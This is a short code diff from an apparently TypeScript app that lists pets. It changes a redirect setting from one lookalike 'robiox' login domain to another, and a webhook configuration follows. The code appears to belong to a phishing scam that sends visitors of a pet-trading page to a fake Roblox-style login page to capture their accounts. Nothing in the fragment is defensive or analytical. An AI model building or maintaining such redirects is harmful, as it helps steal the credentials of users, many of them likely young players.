@@ -117,7 +117,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.robiox.com.am/login?returnUrl=9603182548180515",
+  url: "https://www.robiox.com.kz/login?returnUrl=9603182548180515",
 }
 
 // Webhook configuration
